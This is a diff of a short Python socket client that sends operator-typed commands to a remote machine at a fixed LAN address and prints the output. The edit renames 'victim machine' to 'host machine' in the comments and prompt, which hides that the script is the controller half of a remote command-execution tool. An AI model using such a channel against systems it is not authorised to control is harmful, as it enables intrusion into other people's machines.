@@ -1,6 +1,6 @@
 from socket import socket
 
-# Define the server address and port (Always of the victim machine)
+# Define the server address and port (Always of the host machine)
 server_address = ('192.168.1.11', 5000)
 
 # Create the client socket, as we re-establish the connection for each command executed
@@ -11,7 +11,7 @@ state = True
 while state:
 
     # Ask the user to input a command
-    command_send = input("Enter the command you want to send to the victim machine (or 'exit' to quit): ")
+    command_send = input("Enter the command you want to send to the host machine (or 'exit' to quit): ")
 
     # If the user enters "exit", close the connection and exit the loop
     if command_send == 'exit':
@@ -21,10 +21,10 @@ while state:
         client_socket.close()
         state = False
     else:
-        # Send the command to the victim machine:
+        # Send the command to the host machine:
         client_socket.send(command_send.encode())
 
-        # Wait to receive the response from the victim and store it in the variable 'response'.
+        # Wait to receive the response from the host and store it in the variable 'response'.
         response = client_socket.recv(4096)
 
         # Print the response;
